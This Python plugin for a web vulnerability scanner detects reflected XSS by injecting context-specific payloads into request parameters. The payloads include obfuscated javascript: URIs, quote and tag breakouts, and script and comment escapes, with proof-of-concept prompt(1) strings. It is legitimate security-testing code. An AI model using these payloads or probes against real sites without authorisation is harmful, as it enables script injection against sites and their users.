#!/usr/bin/env python3
# @Time    : 2020-02-27
# @Author  : caicai
# @File    : myscan_xss.py
'''
refer:https://github.com/s0md3v/XSStrike,https://xray.cool/xray
按照xsstrike的分类，分为插入点在html,attribute(属性),comment(注释),script(脚本)
2020.2.27
目前只按照xray的规则，目前只写了hmtl和attribute部分，
思路:html直接爆破几个payload就行了,后面用//注释，第二种方法闭合标签再使用payload，
attribute部分测试能否闭合，然后测试添加新的tag或者attribute即可，
如有误报，慢慢调代码。
2020.3.4
按照xray的payload完成了script和comment部分
2020.3.10
修复若干bug,村
'''

from myscan.lib.scriptlib.xss.const import attr_payloads, tag_payloads
from myscan.lib.parse.dictdata_parser import dictdata_parser
from myscan.lib.core.const import notAcceptedExt
from myscan.lib.parse.response_parser import response_parser
from myscan.lib.core.common import get_random_str
from myscan.lib.scriptlib.xss.common import htmlparser,getposition
from myscan.lib.scriptlib.xss.common import check
from myscan.config import plugin_set
import copy

class POC():
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
        # scheme的poc不同perfoler和perfile,没有workdata没有data字段,所以无self.url
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.name = "xss"
        self.vulmsg = "通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序"
        self.level = 2  # 0:Low  1:Medium 2:High

    def verify(self):

        # xssflagstr = get_random_str(6)

        if self.dictdata.get("url").get("extension").lower() in notAcceptedExt:
            return
        response_ct = self.dictdata.get("response").get("headers").get("Content-Type", "")

        if "html" not in response_ct.lower():
            return
        # Url Body 参数注入

        parser = dictdata_parser(self.dictdata)
        parser.getresponsebody()
        params_url = self.dictdata.get("request").get("params").get("params_url")
        params_body = self.dictdata.get("request").get("params").get("params_body")
        params_tests = {}
        if params_url:
            params_tests["url"] = params_url
        if params_body:
            params_tests["body"] = params_body
        if params_tests:
            for params_type, params_ in params_tests.items():
                for param in params_:
                    test_str = get_random_str(8).lower()
                    res_random_str, r = check(parser, param, -1, test_str, test_str, {}, params_type, [test_str])
                    if res_random_str:
                        random_context=getposition(r.content,test_str.encode())
                        occurences = htmlparser(r.text, test_str)
                        if occurences:
                            positions = list(occurences.keys())
                            msg_low_level = []
                            for num in range(len(positions)):
                                flag = False
                                if occurences[positions[num]]["context"] == "attribute":
                                    #    attr :{416: {'position': 416, 'context': 'attribute', 'details': {'tag': 'input', 'type': 'value', 'quote': "'", 'value': 'fuckhaha', 'name': 'value'}}}
                                    #针对在value里面，可以直接使用javascript的情况
                                    if occurences[positions[num]]["details"]["name"].lower() in list(set(
                                            ["href", "src", "action", "formaction", "data", "from", "onclick", "url"])) and occurences[positions[num]]["details"]["type"].lower() =="value":
                                        if occurences[positions[num]]["details"]["value"].lower().startswith(test_str):
                                            random_str = get_random_str(8).lower()
                                            payloads = [
                                                ("jaVa&#x73;&#x63;&#x72;ipt:{}",
                                                 ["javascript:{}", "jaVa&#x73;&#x63;&#x72;ipt:{}"]),
                                                ("jAvaScRiPt:{}", ["javascript:{}"])
                                            ]
                                            for p, show in payloads:
                                                payload = p.format(random_str)
                                                show_formated = [show_.format(random_str) for show_ in show]
                                                res, r_data = check(parser, param, num, payload, random_str, occurences,
                                                                    params_type, show_formated,random_context)
                                                if res:
                                                    flag=True
                                                    payload = payload.replace(random_str, "alert(1)")
                                                    self.save(r_data, param, payload)
                                                    break

                                    #针对出现在name,flag 情况，详情看xss/common.py ,使用>闭合
                                    if occurences[positions[num]]["details"]["type"] in ["name","flag"] :
                                        payload_pre = ">"
                                        if self.xss_withpayload(parser, param, num, payload_pre, occurences,
                                                                params_type,random_context):
                                            flag = True
                                    #针对在value里面，通过'"`闭合
                                    if occurences[positions[num]]["details"]["type"]=="value" and not flag:
                                        can_use_tag, can_close, can_use_attr = False, False, False
                                        random_str = get_random_str(8).lower()
                                        payload_tag = "<{}>".format(random_str)
                                        if check(parser, param, num, payload_tag, random_str, occurences, params_type,None,random_context)[0]:
                                            can_use_tag = True
                                        random_str = get_random_str(8).lower()
                                        payload_close = "{}>{}".format(occurences[positions[num]]["details"]["quote"],
                                                                       random_str)
                                        if check(parser, param, num, payload_close, random_str, occurences, params_type,None,random_context)[0]:
                                            can_close = True
                                        random_str = get_random_str(8).lower()
                                        payload_attr = "{}{}=".format(occurences[positions[num]]["details"]["quote"],
                                                                      random_str)
                                        if check(parser, param, num, payload_attr, random_str, occurences, params_type,None,random_context)[0]:
                                            can_use_attr = True
                                        if can_use_attr:
                                            random_str = get_random_str(8).lower()
                                            for p, show in attr_payloads:
                                                payload = "{} {}".format(occurences[positions[num]]["details"]["quote"],
                                                                         p.format(random_str))
                                                show_formated = [
                                                    "{} {}".format(occurences[positions[num]]["details"]["quote"],
                                                                   show_.format(random_str)) for show_ in show]
                                                res, r_data = check(parser, param, num, payload, random_str, occurences,
                                                                    params_type, show_formated,random_context)
                                                if res:
                                                    payload = payload.replace(random_str, "prompt(1)") + "//"
                                                    self.save(r_data, param, payload)
                                                    flag = True
                                                    break
                                            if not flag:

                                                msg_low_level.append(
                                                    "参数值在attribute内,且可使用{}>闭合,可添加新attribute饶过，可尝试用工具枚举".format(
                                                        occurences[positions[num]]["details"]["quote"]))
                                        if (not flag) and can_close and can_use_tag:
                                            random_str = get_random_str(8).lower()
                                            for p, show in tag_payloads:
                                                payload = "{}>{}".format(occurences[positions[num]]["details"]["quote"],
                                                                         p.format(random_str))
                                                show_formated = [
                                                    "{}>{}".format(occurences[positions[num]]["details"]["quote"],
                                                                   show_.format(random_str)) for show_ in show]
                                                res, r_data = check(parser, param, num, payload, random_str, occurences,
                                                                    params_type, show_formated,random_context)
                                                if res:
                                                    payload = payload.replace(random_str, "prompt(1)")
                                                    self.save(r_data, param, payload)
                                                    flag = True
                                                    break
                                            if not flag:

                                                msg_low_level.append(
                                                    "参数{}值在attribute内,且可使用{}>闭合和使用<random>,可添加新tag绕过，可使用工具枚举".format(
                                                        param.get("name"), occurences[positions[num]]["details"]["quote"]))

                                if occurences[positions[num]]["context"] == "html":

                                    badtag = occurences[positions[num]]["details"].get("badTag", "")
                                    if not badtag:
                                        payload_pre = ""
                                        if self.xss_withpayload(parser, param, num, payload_pre, occurences,
                                                                params_type,random_context):
                                            flag = True
                                    if not flag:
                                        payload_pre = "</"+badtag+">"
                                        if self.xss_withpayload(parser, param, num, payload_pre, occurences,
                                                                params_type,random_context):
                                            flag = True
                                    if not flag:
                                        msg_low_level.append(
                                            "参数{}值在html标签内,可尝试用工具枚举".format(param.get("name")))

                                if occurences[positions[num]]["context"] == "comment":
                                    for payload_pre in ("-->", "--!>"):
                                        if self.xss_withpayload(parser, param, num, payload_pre, occurences,
                                                                params_type,random_context):
                                            flag = True
                                            break
                                    if not flag:

                                        msg_low_level.append(
                                            "参数{}值在comment标签内,可尝试用工具枚举".format(param.get("name")))
                                if occurences[positions[num]]["context"] == "script":
                                    # 判断是否在注释里 1./* xx\r\nxxx */ 2. // xxxxx
                                    annotation = occurences[positions[num]]["details"]["annotation"]
                                    quote = occurences[positions[num]]["details"].get("quote", "")
                                    if annotation != "":
                                        if annotation == "/*":
                                            random_str = get_random_str(8).lower()
                                            for payload, show_formated in [
                                                ("*/;{};/*".format(random_str), ["*/;{};/*".format(random_str)])
                                            ]:
                                                res, r_data = check(parser, param, num, payload, random_str, occurences,
                                                                    params_type, show_formated,random_context)
                                                if res:
                                                    payload = payload.replace(random_str, "prompt(1)") + "//"
                                                    self.save(r_data, param, payload)
                                                    flag = True
                                                    break
                                        if annotation == "//":
                                            random_str = get_random_str(8).lower()
                                            for payload, show_formated in [
                                                ("\n;{};//".format(random_str), ["\n;{};//".format(random_str)])
                                            ]:
                                                res, r_data = check(parser, param, num, payload, random_str, occurences,
                                                                    params_type, show_formated,random_context)
                                                if res:
                                                    payload = payload.replace(random_str, "prompt(1)") + "//"
                                                    self.save(r_data, param, payload)
                                                    flag = True
                                                    break

                                    else:
                                        if quote:
                                            random_str = get_random_str(8).lower()
                                            payload = "{}-{}-{}".format(quote, random_str,quote)
                                            show_formated = [payload]
                                            res, r_data = check(parser, param, num, payload, random_str, occurences,
                                                                params_type, show_formated,random_context)
                                            if res:
                                                payload_=[]
                                                for x,y in enumerate(["{}-{}//".format(quote, "prompt(1)"),payload.replace(random_str, "prompt(1)")]):
                                                    payload_.append("{}:{}".format(x,y))
                                                self.save(r_data, param, " , ".join(payload_))
                                                flag = True
                                    if not flag:

                                        payload_pre = "</ScRiPt>"
                                        if self.xss_withpayload(parser, param, num, payload_pre, occurences,
                                                                params_type,random_context):
                                            flag = True

                                    if not flag:
                                        msg_low_level.append(
                                            "参数{}值在script标签内,可尝试用工具枚举".format(param.get("name")))

                            if plugin_set.get("xss").get("use_low_level", False) and msg_low_level:
                                self.save(r, param, "\r\n".join(list(set(msg_low_level))), 0)

    def save(self, r, param, payload, level=None):
        parse_ = response_parser(r)
        self.result.append({
            "name": self.name,
            "url": self.dictdata.get("url").get("url").split("?")[0],
            "level": self.level if level == None else level,  # 0:Low  1:Medium 2:High
            "detail": {
                "vulmsg": self.vulmsg,
                "param": param.get("name"),
                "payload": payload,
                "request": parse_.getrequestraw(),
                "response": parse_.getresponseraw()
            }
        })

    def xss_withpayload(self, parser, param, num, payload_pre, occurences, params_type,random_context):
        flag = False
        random_str = get_random_str(8).lower()
        payload = payload_pre + "<{}>".format(random_str)
        show_formated = [payload]
        res, r_data = check(parser, param, num, payload, random_str, occurences,
                            params_type, show_formated,random_context)
        # print("payload {} ,show:{}, res:{}".format(payload,show_formated,res))
        if res:
            for p, show_formated in tag_payloads:
                random_str = get_random_str(8).lower()
                payload = (payload_pre + p).format(random_str)
                show_formated = [(payload_pre + s).format(random_str) for s in
                                 show_formated]
                res, r_data = check(parser, param, num, payload, random_str,
                                    occurences,
                                    params_type, show_formated,random_context)
                if res:
                    p=payload.replace(random_str, "prompt(1)")
                    payload = [p,p + "//"]
                    self.save(r_data, param, " ".join(payload))
                    flag = True
                    break
        return flag
